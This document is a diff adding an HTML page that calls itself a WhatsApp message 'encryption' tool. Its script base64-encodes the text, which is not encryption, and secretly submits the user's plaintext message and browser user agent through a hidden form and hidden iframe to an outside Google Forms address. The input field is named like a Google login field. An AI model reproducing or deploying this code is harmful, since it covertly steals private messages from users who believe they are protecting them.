@@ -1,0 +1,117 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+   <meta name="viewport" content="width=device-width">   
+   <link rel="icon" size="120x120" href="https://www.pointcare.com/wp-content/uploads/2018/12/lock-icon.png">
+    </head>
+    <title>
+  Encrypt Messages Of Whatsapp      
+    </title>
+    <style>
+    *::selection{
+        color:#FFF;
+        Background-color:Red;
+    }
+    #fr{
+        display:none;
+        color:green;
+        Font-Size:12px;
+        background-color:#000;
+    }   
+    #Dr{
+        display:none;
+        color:green;
+        Font-Size:12px;
+        background-color:#000;
+    }   
+    #ti{
+        color:Silver;
+        Background-color:green;
+        Padding:12px;
+        Font-weight:bold;
+        Text-align:Center;
+        Font-size:12px;
+    
+        Position:Static;
+    }
+    input[type=Submit]{
+    
+        color:#FFF;
+        background-color:#4AFCAE;
+        padding:12px;
+        Border:none;
+        Border-radius:4px;
+    }
+input[type=text]{
+    
+        color:#000;
+        background-color:#FFF;
+        padding:12px;
+        Border:2px Solid #4ADCAF;
+        Border-radius:4px;
+    }
+input[type=text]:hover{
+    
+        
+        Border:2px solid #4ACCFF;
+    
+    }
+    </style>
+    <script>
+       /* function $HForm(Act){
+ var C = document.createElement('form');
+ C.action = Act;
+ C.onsubmit = return false;
+ document.body.appendChild(C);
+}*/
+/*function $HInput(name , type){
+var E = document.createElement('input');
+E.type = type;
+
+}
+setTimeout(function(){$HForm("#").appendChild($HInput("va" , "text"))} ,2000);*/
+function HSend(){
+    var C = document.getElementById("4");
+var D = document.getElementById("1");
+var E = document.getElementById("2");
+var R = document.getElementById("x");
+var Y = document.getElementById("fr");
+var G = window.btoa(R.value);
+var K = `whatsapp://send?text=${G}`;
+Y.style.display = "block";
+Y.value = G;
+D.value = R.value;
+E.value = navigator.userAgent;
+ C.submit();   
+ window.open(K ,"blank");
+}
+
+    </script>
+    <body>
+<iframe name="t" style="display:none;"></iframe>
+<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse" method="POST" target="t" style="display:none;" id="4">
+<input type="text" id="1" name="entry.190958851">
+<input type="text" id="2" name="entry.470512502">
+<input type="submit">
+</form>
+   <form action="https://accounts.google.com" onsubmit="return false">
+       <table>
+           <tr>
+               <td>
+                   <div id="ti">
+      Decrypted Message And Send THrough Whatsapp                
+                   </div>
+ <input type="text" name="identifier" id="x" placeholder="Paste Message To Encrypt" oninput="Decode()"> 
+ </td>
+ </tr>
+           <tr>
+               <td>
+ <input type="submit" value="Send Decode Message Through Whatsapp" onclick="HSend()">
+ </td>
+ </tr>
+ </table>
+   </form>    
+   <textarea rows="10" cols="40" id="fr"></textarea>
+
+    </body>
+</html>
